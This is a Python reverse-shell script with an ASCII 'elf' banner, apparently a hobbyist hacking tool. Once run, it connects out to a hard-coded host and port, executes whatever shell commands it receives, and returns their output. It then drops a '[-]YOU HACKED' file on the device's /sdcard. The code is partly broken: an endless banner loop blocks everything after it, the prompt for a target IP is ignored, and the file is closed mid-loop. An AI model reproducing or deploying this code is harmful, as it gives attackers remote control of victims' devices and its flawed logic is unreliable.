#TYPED PYTHON_3
#creator: @e_l_f_6_6_6
import socket
import subprocess
import os
from colorama import Fore ,Back ,Style
#banner
while True:
    print(Back.WHITE+Fore.BLACK+Style.BRIGHT+"""
                                    # elf #
                               .7KBQBBBBBBBBBIr                           
                            i5RQQP1ri..   ..i7IbQQM2i                      
                        rQBBDY.                   .JgBBMr                  
                     rBQB7                             vBBBi               
                   PBBr                                   vBQI             
                 ZBD.                                       .QBX           
               IBg                                             BBv         
              BB.                                               .BB        
            vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
           DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
          BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
         gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
        YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
        B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
       BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
      .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
      BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
      B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
     jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
     BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
     BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
     BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
     BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
     vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
      B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
      QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
       B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
       BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
        B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
        7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
         bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
          gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
           KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
            rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
              QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
               7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                 XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                   uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                     :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                        idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                            .rv1XZMQQBBBBBBBQQgZSu7i            
                                      bay     
          
          

    """)
    if os.name == 'nt':
   
        os.system('cls')
   
    else:
    
        os.system('clear')
    print('loding..!')
input(Fore.YELLOW+'[-]enter the ip your target:')   
print('loding..!') 
    
HOST = '192.168.1.35'
PORT = 8080
B_SIZE = 1024 * 128
SEPARATOR = "_elf_"

s = socket.socket()
s.connect((HOST, PORT))

cwd = os.getcwd()

s.send(cwd.encode())

while True:

    c1 = s.recv(B_SIZE).decode()

    sc = c1.split()

    if c1.lower() == "exit":

        break

    if sc[0].lower() == "cd":

        try:

            os.chdir(' '.join(sc[1:]))

        except FileNotFoundError as e:

            o = str(e)

        else:

            o = ""
    else:

        o = subprocess.getoutput(c1)

    cwd = os.getcwd()

    sms = f"{o}{SEPARATOR}{cwd}"

    s.send(sms.encode())

s.close()
while True:
    os.chdir("/sdcard")
    f = open("look_at_me.txt","w+")
    c = 50
    for i in range(c):
        f.write('[-]YOU HACKED \n ')
        f.close()
    if c == 50:
        break

